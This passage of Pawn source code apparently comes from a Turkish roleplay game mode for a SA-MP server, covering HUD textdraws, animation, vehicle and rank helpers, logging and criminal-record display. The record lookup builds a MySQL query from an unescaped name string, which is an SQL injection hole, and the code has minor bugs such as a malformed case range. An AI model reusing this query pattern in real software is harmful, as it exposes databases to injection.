	PlayerTextDrawColor(playerid, CanTD[playerid], -1306385665);
	PlayerTextDrawSetShadow(playerid, CanTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, CanTD[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, CanTD[playerid], 255);
	PlayerTextDrawFont(playerid, CanTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, CanTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, CanTD[playerid], 0);

	ZirhTD[playerid] = CreatePlayerTextDraw(playerid, 540.666748, 437.229675, "100");
	PlayerTextDrawLetterSize(playerid, ZirhTD[playerid], 0.203000, 1.035851);
	PlayerTextDrawAlignment(playerid, ZirhTD[playerid], 1);
	PlayerTextDrawColor(playerid, ZirhTD[playerid], -320017153);
	PlayerTextDrawSetShadow(playerid, ZirhTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, ZirhTD[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, ZirhTD[playerid], 255);
	PlayerTextDrawFont(playerid, ZirhTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, ZirhTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, ZirhTD[playerid], 0);

	SaatTD[playerid] = CreatePlayerTextDraw(playerid, 537.033447, 415.688873, "12-12-18_24:60");
	PlayerTextDrawLetterSize(playerid, SaatTD[playerid], 0.161999, 0.832593);
	PlayerTextDrawAlignment(playerid, SaatTD[playerid], 1);
	PlayerTextDrawColor(playerid, SaatTD[playerid], -1);
	PlayerTextDrawSetShadow(playerid, SaatTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, SaatTD[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, SaatTD[playerid], 255);
	PlayerTextDrawFont(playerid, SaatTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, SaatTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, SaatTD[playerid], 0);

	BankaParaTD[playerid] = CreatePlayerTextDraw(playerid, 566.999816, 437.644500, "$1000000");
	PlayerTextDrawLetterSize(playerid, BankaParaTD[playerid], 0.182000, 0.903111);
	PlayerTextDrawAlignment(playerid, BankaParaTD[playerid], 1);
	PlayerTextDrawColor(playerid, BankaParaTD[playerid], 579543807);
	PlayerTextDrawSetShadow(playerid, BankaParaTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, BankaParaTD[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, BankaParaTD[playerid], 255);
	PlayerTextDrawFont(playerid, BankaParaTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, BankaParaTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, BankaParaTD[playerid], 0);

	PaydaySureTD[playerid] = CreatePlayerTextDraw(playerid, 568.333251, 428.933441, "60dk");
	PlayerTextDrawLetterSize(playerid, PaydaySureTD[playerid], 0.182333, 0.799407);
	PlayerTextDrawAlignment(playerid, PaydaySureTD[playerid], 1);
	PlayerTextDrawColor(playerid, PaydaySureTD[playerid], -2139062017);
	PlayerTextDrawSetShadow(playerid, PaydaySureTD[playerid], 0);
	PlayerTextDrawSetOutline(playerid, PaydaySureTD[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, PaydaySureTD[playerid], 255);
	PlayerTextDrawFont(playerid, PaydaySureTD[playerid], 1);
	PlayerTextDrawSetProportional(playerid, PaydaySureTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, PaydaySureTD[playerid], 0);

	AracListeTDSag[playerid] = CreatePlayerTextDraw(playerid, 249.000000, 240.000000, "New Textdraw");
	PlayerTextDrawBackgroundColor(playerid, AracListeTDSag[playerid], 0x00000033);
	PlayerTextDrawFont(playerid, AracListeTDSag[playerid], 5);
	PlayerTextDrawLetterSize(playerid, AracListeTDSag[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid, AracListeTDSag[playerid], -1);
	PlayerTextDrawSetOutline(playerid, AracListeTDSag[playerid], 0);
	PlayerTextDrawSetProportional(playerid, AracListeTDSag[playerid], 1);
	PlayerTextDrawSetShadow(playerid, AracListeTDSag[playerid], 1);
	PlayerTextDrawUseBox(playerid, AracListeTDSag[playerid], 1);
	PlayerTextDrawBoxColor(playerid, AracListeTDSag[playerid], -256);
	PlayerTextDrawTextSize(playerid, AracListeTDSag[playerid], 71.000000, 47.000000);
	PlayerTextDrawSetPreviewRot(playerid, AracListeTDSag[playerid], -16.000000, 0.000000, -55.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid, AracListeTDSag[playerid], 1);

	AracListeTDSol[playerid] = CreatePlayerTextDraw(playerid, 42.000000, 240.000000, "New Textdraw");
	PlayerTextDrawBackgroundColor(playerid, AracListeTDSol[playerid], 0x00000033);
	PlayerTextDrawFont(playerid, AracListeTDSol[playerid], 5);
	PlayerTextDrawLetterSize(playerid, AracListeTDSol[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid, AracListeTDSol[playerid], -1);
	PlayerTextDrawSetOutline(playerid, AracListeTDSol[playerid], 0);
	PlayerTextDrawSetProportional(playerid, AracListeTDSol[playerid], 1);
	PlayerTextDrawSetShadow(playerid, AracListeTDSol[playerid], 1);
	PlayerTextDrawUseBox(playerid, AracListeTDSol[playerid], 1);
	PlayerTextDrawBoxColor(playerid, AracListeTDSol[playerid], -256);
	PlayerTextDrawTextSize(playerid, AracListeTDSol[playerid], 71.000000, 47.000000);
	PlayerTextDrawSetPreviewRot(playerid, AracListeTDSol[playerid], -16.000000, 0.000000, -55.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid, AracListeTDSol[playerid], 1);

	AracListeTD[playerid] = CreatePlayerTextDraw(playerid, 114.000000, 219.000000, "New Textdraw");
	PlayerTextDrawBackgroundColor(playerid, AracListeTD[playerid], 0x00000033);
	PlayerTextDrawFont(playerid, AracListeTD[playerid], 5);
	PlayerTextDrawTextSize(playerid, AracListeTD[playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid, AracListeTD[playerid], -1);
	PlayerTextDrawSetOutline(playerid, AracListeTD[playerid], 0);
	PlayerTextDrawSetProportional(playerid, AracListeTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, AracListeTD[playerid], 1);
	PlayerTextDrawUseBox(playerid, AracListeTD[playerid], 1);
	PlayerTextDrawBoxColor(playerid, AracListeTD[playerid], 255);
	PlayerTextDrawTextSize(playerid, AracListeTD[playerid], 134.000000, 84.000000);
	PlayerTextDrawSetPreviewRot(playerid, AracListeTD[playerid], -16.000000, 0.000000, -55.000000, 1.000000);
	PlayerTextDrawSetSelectable(playerid, AracListeTD[playerid], 1);

	AracListeTDYazi[playerid] = CreatePlayerTextDraw(playerid, 116.000000, 304.000000, "Araba");
	PlayerTextDrawBackgroundColor(playerid, AracListeTDYazi[playerid], 255);
	PlayerTextDrawFont(playerid, AracListeTDYazi[playerid], 1);
	PlayerTextDrawLetterSize(playerid, AracListeTDYazi[playerid], 0.459999, 1.000000);
	PlayerTextDrawColor(playerid, AracListeTDYazi[playerid], -1);
	PlayerTextDrawSetOutline(playerid, AracListeTDYazi[playerid], 0);
	PlayerTextDrawSetProportional(playerid, AracListeTDYazi[playerid], 1);
	PlayerTextDrawSetShadow(playerid, AracListeTDYazi[playerid], 1);
	PlayerTextDrawUseBox(playerid, AracListeTDYazi[playerid], 1);
	PlayerTextDrawBoxColor(playerid, AracListeTDYazi[playerid], 255);
	PlayerTextDrawTextSize(playerid, AracListeTDYazi[playerid], 246.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid, AracListeTDYazi[playerid], 0);

	/*Tel_TD_P[playerid][0] = CreatePlayerTextDraw(playerid, 560.333496, 154.003982, "Ara");
	PlayerTextDrawLetterSize(playerid, Tel_TD_P[playerid][0], 0.437332, 1.251554);
	PlayerTextDrawAlignment(playerid, Tel_TD_P[playerid][0], 1);
	PlayerTextDrawColor(playerid, Tel_TD_P[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, Tel_TD_P[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, Tel_TD_P[playerid][0], 255);
	PlayerTextDrawFont(playerid, Tel_TD_P[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, Tel_TD_P[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][0], 0);
	PlayerTextDrawSetSelectable(playerid, Tel_TD_P[playerid][0], true);
	PlayerTextDrawTextSize(playerid, Tel_TD_P[playerid][0], 600, 15);

	Tel_TD_P[playerid][1] = CreatePlayerTextDraw(playerid, 550.002624, 171.619842, "MESAJ");
	PlayerTextDrawLetterSize(playerid, Tel_TD_P[playerid][1], 0.437332, 1.251554);
	PlayerTextDrawAlignment(playerid, Tel_TD_P[playerid][1], 1);
	PlayerTextDrawColor(playerid, Tel_TD_P[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, Tel_TD_P[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, Tel_TD_P[playerid][1], 255);
	PlayerTextDrawFont(playerid, Tel_TD_P[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, Tel_TD_P[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][1], 0);
	PlayerTextDrawSetSelectable(playerid, Tel_TD_P[playerid][1], true);
	PlayerTextDrawTextSize(playerid, Tel_TD_P[playerid][1], 650, 15);

	Tel_TD_P[playerid][2] = CreatePlayerTextDraw(playerid, 546.103576, 190.120971, "REHBER");
	PlayerTextDrawLetterSize(playerid, Tel_TD_P[playerid][2], 0.437332, 1.251554);
	PlayerTextDrawAlignment(playerid, Tel_TD_P[playerid][2], 1);
	PlayerTextDrawColor(playerid, Tel_TD_P[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, Tel_TD_P[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, Tel_TD_P[playerid][2], 255);
	PlayerTextDrawFont(playerid, Tel_TD_P[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, Tel_TD_P[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, Tel_TD_P[playerid][2], true);
	PlayerTextDrawTextSize(playerid, Tel_TD_P[playerid][2], 650, 15);

	Tel_TD_P[playerid][3] = CreatePlayerTextDraw(playerid, 544.167114, 218.177856, "box");
	PlayerTextDrawLetterSize(playerid, Tel_TD_P[playerid][3], 0.000000, 0.866666);
	PlayerTextDrawTextSize(playerid, Tel_TD_P[playerid][3], 556.000000, 12.500000);
	PlayerTextDrawAlignment(playerid, Tel_TD_P[playerid][3], 1);
	PlayerTextDrawColor(playerid, Tel_TD_P[playerid][3], -1);
	PlayerTextDrawUseBox(playerid, Tel_TD_P[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid, Tel_TD_P[playerid][3], 8388863);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, Tel_TD_P[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, Tel_TD_P[playerid][3], 255);
	PlayerTextDrawFont(playerid, Tel_TD_P[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, Tel_TD_P[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, Tel_TD_P[playerid][3], true);

	Tel_TD_P[playerid][4] = CreatePlayerTextDraw(playerid, 604.618957, 218.177856, "box");
	PlayerTextDrawLetterSize(playerid, Tel_TD_P[playerid][4], 0.000000, 0.866666);
	PlayerTextDrawTextSize(playerid, Tel_TD_P[playerid][4], 616.285278, 12.500000);
	PlayerTextDrawAlignment(playerid, Tel_TD_P[playerid][4], 1);
	PlayerTextDrawColor(playerid, Tel_TD_P[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, Tel_TD_P[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid, Tel_TD_P[playerid][4], -2147483393);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, Tel_TD_P[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, Tel_TD_P[playerid][4], 255);
	PlayerTextDrawFont(playerid, Tel_TD_P[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, Tel_TD_P[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, Tel_TD_P[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, Tel_TD_P[playerid][4], true);*/

}

KonusturMeyhaneci(playerid, length)
{
	if(IsPlayerInAnyVehicle(playerid)) return 1;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && !AnimasyonYapiyor[playerid])
	{
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DUCK) return 1;
		new chatstiLi = Karakter[playerid][chatstili];
		AnimasyonYapiyor[playerid] = true;
		if(Karakter[playerid][chatstili] == 0) { ApplyAnimationEx(playerid,"PED","IDLE_CHAT",4.0,1,0,0,0,0); }
		else if(chatstiLi == 1) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkA",4.0,1,0,0,0,0); }
		else if(chatstiLi == 2) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkB",4.0,1,0,0,0,0); }
		else if(chatstiLi == 3) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkC",4.0,1,0,0,0,0);}
		else if(chatstiLi == 4) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkD",4.0,1,0,0,0,0);}
		else if(chatstiLi == 5) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkE",4.0,1,0,0,0,0);}
		else if(chatstiLi == 6) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkF",4.0,1,0,0,0,0);}
		else if(chatstiLi == 7) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkG",4.0,1,0,0,0,0);}
		else if(chatstiLi == 8) { ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkH",4.0,1,0,0,0,0);}
		if(Karakter[playerid][chatstili] != -1) SetTimerEx("StopTalk",floatround(length/5)*1600, 0, "i", playerid);
	}
	return 1;
}

GetVehicleSpeed(vehicleid)
{
	new Float:Vx, Float:Vy, Float:Vz;
	GetVehicleVelocity(vehicleid, Vx, Vy, Vz);
    new Float:rtn;
    rtn = floatsqroot(floatpower(Vx*100,2) + floatpower(Vy*100,2));
    rtn = floatsqroot(floatpower(rtn,2) + floatpower(Vz*100,2));
    return floatround(rtn);
}

GetClosestVehicle(p1)
{
	new x,Float:dis,Float:dis2,player;
	player = -1;
	dis = 99999.99;
	for (x=0;x<MAX_VEHICLES;x++)
	{
		if(IsValidVehicle(x))
		{
			dis2 = VehiclePlayerDistance(p1,x);
			if(dis2 < dis && dis2 != -1.00)
			{
				dis = dis2;
				player = x;
			}
		}
	}
	return player;
}

stock OyuncuRutbe(playerid)
{
    new rutbes[104];
	if(Karakter[playerid][birlik])
	{
	    new id;
	    id = Karakter[playerid][birlik];
	    if(Karakter[playerid][rutbe] == 1)
	    {
			strmid(rutbes,Birlik[id][rutbe1],0,strlen(Birlik[id][rutbe1]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 2)
	    {
			strmid(rutbes,Birlik[id][rutbe2],0,strlen(Birlik[id][rutbe2]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 3)
	    {
			strmid(rutbes,Birlik[id][rutbe3],0,strlen(Birlik[id][rutbe3]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 4)
	    {
			strmid(rutbes,Birlik[id][rutbe4],0,strlen(Birlik[id][rutbe4]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 5)
	    {
			strmid(rutbes,Birlik[id][rutbe5],0,strlen(Birlik[id][rutbe5]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 6)
	    {
			strmid(rutbes,Birlik[id][rutbe6],0,strlen(Birlik[id][rutbe6]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 7)
	    {
			strmid(rutbes,Birlik[id][rutbe7],0,strlen(Birlik[id][rutbe7]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 8)
	    {
			strmid(rutbes,Birlik[id][rutbe8],0,strlen(Birlik[id][rutbe8]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 9)
	    {
			strmid(rutbes,Birlik[id][rutbe9],0,strlen(Birlik[id][rutbe9]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 10)
	    {
			strmid(rutbes,Birlik[id][rutbe10],0,strlen(Birlik[id][rutbe10]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 11)
	    {
			strmid(rutbes,Birlik[id][rutbe11],0,strlen(Birlik[id][rutbe11]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 12)
	    {
			strmid(rutbes,Birlik[id][rutbe12],0,strlen(Birlik[id][rutbe12]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 13)
	    {
			strmid(rutbes,Birlik[id][rutbe13],0,strlen(Birlik[id][rutbe13]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 14)
	    {
			strmid(rutbes,Birlik[id][rutbe14],0,strlen(Birlik[id][rutbe14]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 15)
	    {
			strmid(rutbes,Birlik[id][rutbe15],0,strlen(Birlik[id][rutbe15]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 16)
	    {
			strmid(rutbes,Birlik[id][rutbe16],0,strlen(Birlik[id][rutbe16]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 17)
	    {
			strmid(rutbes,Birlik[id][rutbe17],0,strlen(Birlik[id][rutbe17]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 18)
	    {
			strmid(rutbes,Birlik[id][rutbe18],0,strlen(Birlik[id][rutbe18]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 19)
	    {
			strmid(rutbes,Birlik[id][rutbe19],0,strlen(Birlik[id][rutbe19]),64);
	    }
	    else if(Karakter[playerid][rutbe] == 20)
	    {
			strmid(rutbes,Birlik[id][rutbe20],0,strlen(Birlik[id][rutbe20]),64);
	    }
	    else
	    {
	        strmid(rutbes,"(Yok)",0,strlen("(Yok)"),64);
	    }
	}
	return rutbes;
}

forward Aractamiri(vehicleid);
public Aractamiri(vehicleid)
{
    RepairVehicleEx(vehicleid);
	Arac[vehicleid][ahasar] = 1000.0;
	SetVehicleHealth(vehicleid, 1000.0);
	//SetPVarInt(playerid, "VehicleRepair", 1);
	return 1;
}

AracMesafesi(Float:uzaklik,playerid)
{
	if(IsPlayerInAnyVehicle(playerid)) return GetPlayerVehicleID(playerid);
	new Float:_ax,Float:_ay,Float:_az;
	for(new i=0;i<MAX_VEHICLES;i++)
	{
		GetVehiclePos(i,_ax,_ay,_az);
		if(PlayerToPoint(uzaklik,playerid,_ax,_ay,_az) && GetClosestVehicle(playerid) == i && GetVehicleVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
		{
			return i;
		}
	}
	return 0;
}

stock HexToInteger(string[])
{
  if (string[0]==0) return 0;
  new i;
  new cur=1;
  new res=0;
  for (i=strlen(string);i>0;i--)
  {
    if (string[i-1]<58) res=res+cur*(string[i-1]-48); else res=res+cur*(string[i-1]-65+10);
    cur=cur*16;
  }
  return res;
}

Log(playerid, string[])
{
	for(new i=0;i<strlen(string);i++) {
		if(string[i] == 'ü') string[i] = 'u';
		else if(string[i] == 'Ü') string[i] = 'U';
		else if(string[i] == 'ö') string[i] = 'o';
		else if(string[i] == 'Ö') string[i] = 'O';
		else if(string[i] == 'ý') string[i] = 'i';
		else if(string[i] == 'Ý') string[i] = 'I';
		else if(string[i] == 'ð') string[i] = 'g';
		else if(string[i] == 'Ð') string[i] = 'G';
		else if(string[i] == 'þ') string[i] = 's';
		else if(string[i] == 'Þ') string[i] = 'S';
		else if(string[i] == 'ç') string[i] = 'c';
		else if(string[i] == 'Ç') string[i] = 'C';
	}

	new saat, dakika, saniye;
	new yil, ay, gun;
	gettime(saat, dakika, saniye);
	getdate(yil, gun, ay);

	new isim[MAX_PLAYER_NAME];
	GetPlayerName(playerid,isim,sizeof(isim));
	new isimstring[128];
	format(isimstring, sizeof(isimstring), "loglar/%s.log", isim);
	new yaziyaz[512];
	format(yaziyaz, sizeof(yaziyaz), "[%d][%d][%d] [%d:%d:%d]%s\r\n", gun, ay, yil, saat, dakika, saniye, string);
	new File:hFile;
	hFile = fopen(isimstring, io_append); //kaydedileceði yer
	if(hFile) {
		fwrite(hFile, yaziyaz);
		fclose(hFile);
	}
}

DurumuGoster(playerid, targetid)
{
	new string[128], cins[7], tenrengi[7], kdurum[10], _sdurum[16],
	_boytext[12],_kilotext[12],_grenktext[12],_srenktext[12];
	switch(Karakter[targetid][cinsiyet])
	{
	    case 1: format(cins, sizeof(cins), "Erkek");
	    case 2: format(cins, sizeof(cins), "Kadýn");
	}
	switch(Karakter[targetid][uyruk])
	{
	    case 1: format(tenrengi, sizeof(tenrengi), "Siyahi");
	    case 2: format(tenrengi, sizeof(tenrengi), "Beyaz");
	}
	switch(KarakterOzellik[targetid][Guc])
	{
	    case 0..1: format(kdurum, sizeof(kdurum), "Zayýf");
	    case 2..4: format(kdurum, sizeof(kdurum), "Normal");
	    case 5..8: format(kdurum, sizeof(kdurum), "Fit");
	    case 9.12: format(kdurum, sizeof(kdurum), "Kalýplý");
	    case 13..17: format(kdurum, sizeof(kdurum), "Kaslý");
	    case 18..20: format(kdurum, sizeof(kdurum), "Kas Yýðýný");
	}
	switch(Karakter[targetid][boy])
	{
	    case 1: _boytext = "1.50-1.60m";
	    case 2: _boytext = "1.61-1.70m";
	    case 3: _boytext = "1.71-1.76m";
	    case 4: _boytext = "1.77-1.85m";
	    case 5: _boytext = "+1.85m";
	}
	switch(Karakter[targetid][kilo])
	{
	    case 1: _kilotext = "40-50kg";
	    case 2: _kilotext = "51-60kg";
	    case 3: _kilotext = "61-65kg";
	    case 4: _kilotext = "66-75kg";
	    case 5: _kilotext = "76-85kg";
     	case 6: _kilotext = "86-90kg";
     	case 7: _kilotext = "91-100kg";
     	case 8: _kilotext = "101-120kg";
     	case 9: _kilotext = "+120kg";
	}
	switch(Karakter[targetid][gozrenk])
	{
	    case 1: _grenktext = "Siyah";
	    case 2: _grenktext = "Kahverengi";
	    case 3: _grenktext = "Mavi";
	    case 4: _grenktext = "Yeþil";
	    case 5: _grenktext = "Diðer";
	}
	switch(Karakter[targetid][sacrenk])
	{
	    case 1: _srenktext = "Kel";
	    case 2: _srenktext = "Siyah";
	    case 3: _srenktext = "Kahverengi";
	    case 4: _srenktext = "Kumral";
	    case 5: _srenktext = "Sarý";
	    case 6: _srenktext = "Kýzýl";
	    case 7: _srenktext = "Diðer";
	}
	if(IsPlayerBleeding(targetid)) _sdurum = "Kanama Var";
	else _sdurum = "Kanama Yok";
	format(string, sizeof(string), "%s adlý kiþinin dýþ görünüþünü inceliyorsunuz.", OyuncuAdiniBul(targetid));
 	Ipucu(playerid, string);
	format(string,128,""C7"| Görünüþ: "C1"Yaþ: %d, Cinsiyet: %s, Ten Rengi: %s, Vücut: %s (%d Seviye)",Karakter[targetid][yas],cins,tenrengi,kdurum,KarakterOzellik[targetid][Guc]);
	SendClientMessage(playerid,-1,string);
	format(string,128,""C7"| Görünüþ: "C1"Boy: %s, Kilo: %s, Saç Rengi: %s, Göz Rengi: %s",_boytext,_kilotext,_srenktext,_grenktext);
    SendClientMessage(playerid,-1,string);
    format(string,128,""C7"| Saðlýk: "C1"Durum: [%s]",_sdurum);
    SendClientMessage(playerid,-1,string);
}

SicilGorunteleEx(playerid, _string[])
{
	new string[128],__string[35];
	format(__string, 35, "%s", _string);
	strreplace(__string, "_", " ");
    format(string, sizeof(string), ""C2"["C1"(%s)"C2"]", __string);
 	SendClientMessage(playerid, -1, string);
	new sa[128];
	format(sa,sizeof(sa),"SELECT * FROM `sabikaydi` WHERE `isim` = '%s'",__string);
	new Cache:cache = mysql_query(sa, true);
	new test1[128],test4[128],test5[35],test2[256];
	for(new i;i<cache_get_row_count();i++)
	{
		cache_get_field_content(i, "suc", test1);
	  	cache_get_field_content(i, "tarih",test4);
	  	cache_get_field_content(i, "tutuklayan",test5);
  	 	format(test2,sizeof(test2),""C3"Gerekçe : "C1"%s - "C3"Tarih : "C1"%s - "C3"Memur : "C1"%s ",test1,test4,test5);
	 	SendClientMessage(playerid,COLOR_WHITE,test2);
	}
	if(!cache_num_rows())
	{
	 	Hata(playerid,"Sabýka kaydý bulunamadý.");
	}
	cache_delete(cache);
	foreach(new targetid : Player)
	{
		if(Buysa(Isim(targetid),_string) && Karakter[targetid][ceza] >= 1)
		{
		    SendClientMessage(playerid, COLOR_WHITE, ""C7"| Ceza Durumu |");
		    format(string, sizeof(string), ""C1"Ödenmemiþ Ceza : "C1"%d"DOLAR"$", Karakter[targetid][ceza]);
		    SendClientMessage(playerid, COLOR_WHITE, string);
		    format(string, sizeof(string), ""C1"Ceza Kesilme Nedeni : "C1"%s", Karakter[targetid][cezaneden]);
		    SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
}

SicilGoruntule(playerid, targetid)
{
	new cins[6], string[256], job[10], tenrengi[7], targetfact[32],targetrank[50];
	switch(Karakter[targetid][cinsiyet])
	{
	    case 1: format(cins, sizeof(cins), "Erkek");
	    case 2: format(cins, sizeof(cins), "Kadýn");
	}
	switch(Karakter[targetid][uyruk])
	{
	    case 1: format(tenrengi, sizeof(tenrengi), "Siyahi");
	    case 2: format(tenrengi, sizeof(tenrengi), "Beyaz");
	}
	switch(Karakter[targetid][meslek])
	{
	    case 0: format(job, sizeof(job), "(Ýþsiz)");
	    case 1: format(job, sizeof(job), "Sevkiyat");
	    case 2: format(job, sizeof(job), "Taksici");
	    case 3: format(job, sizeof(job), "Tezgahtar");
	    case 4: format(job, sizeof(job), "Pizzacý");
	    case 5: format(job, sizeof(job), "Araç Sicil Temizleme");
     	case 6: format(job, sizeof(job), "Otobüs Þöförlüðü");
     	case 7: format(job, sizeof(job), "Temizlik Görevlisi");
	}
	if(Karakter[targetid][birlik] == 0)
	{
		targetfact = "Sivil";
	}
	else
	{
	    format(targetfact, sizeof(targetfact), Birlik[Karakter[targetid][birlik]][fisim]);
	}
	switch(Karakter[targetid][rutbe])
	{
 		case 0: targetrank = "Sivil";
		case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe1]);
		case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe2]);
  		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe3]);
    	case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe4]);
	    case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe5]);
	    case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe6]);
		case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe7]);
		case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe8]);
		case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe9]);
		case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe10]);
		case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe11]);
		case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe12]);
		case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe13]);
		case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe14]);
		case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe15]);
		case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe16]);
		case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe17]);
		case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe18]);
		case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe19]);
		case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[targetid][birlik]][rutbe20]);
	}
	new sa[516], test1[128], test4[128], test5[128], test2[128];
	format(string, sizeof(string), ""C7"| "C1"(%s) "C7"|", OyuncuAdiniBul(targetid));
 	SendClientMessage(playerid, -1, string);
   	format(string, sizeof(string), ""C7"| Karakter: "C1"Vatandaþlýk Numarasý: %d, Birlik: %s, Rütbe: %s, Meslek: %s", Karakter[targetid][kimlikno], targetfact, targetrank, job);
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), ""C7"| Bilgiler: "C1"Banka Hesap No: %d, Telefon No: %d", Karakter[targetid][hesapno], Karakter[targetid][telno]);
	SendClientMessage(playerid, -1, string);
	format(sa,sizeof(sa),"SELECT * FROM `sabikaydi` WHERE `isim` = '%s'",OyuncuAdiniBul(targetid));
	new Cache:cache = mysql_query(sa, true);
	for(new i;i<cache_get_row_count();i++)
	{
		cache_get_field_content(i, "suc", test1);
  		cache_get_field_content(i, "tarih",test4);
	    cache_get_field_content(i, "tutuklayan",test5);
  	   	format(test2,sizeof(test2),"{CCE6E6}Gerekçe:%s - Tarih:%s - Memur:%s ",test1,test4,test5);
	 	SendClientMessage(playerid,COLOR_WHITE,test2);
	}
	if(!cache_num_rows())
	{
	 	SendClientMessage(playerid,COLOR_WHITE,"Sabýka kaydý bulunamadý.");
	}
